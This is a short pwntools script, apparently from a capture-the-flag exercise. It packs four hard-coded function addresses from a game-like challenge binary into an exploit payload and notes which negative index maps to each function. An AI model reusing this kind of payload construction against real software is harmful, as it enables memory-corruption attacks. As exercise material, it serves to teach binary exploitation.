from pwn import *


generate_boss = str(p32(0x08048af2)) # -4
hit = str(p32(0x0804864b)) # -3
druid_heal = str(p32(0x0804889f)) # -2
warrior_attack = str(p32(0x08048688 )) # -1

"""
2 - heal 
1 - attack
oraz
-1 - warrior_attack
-2 - druid_heal
-3 - hit
-4 - generate_boss

"""

result = generate_boss + hit + druid_heal + warrior_attack


print(result)
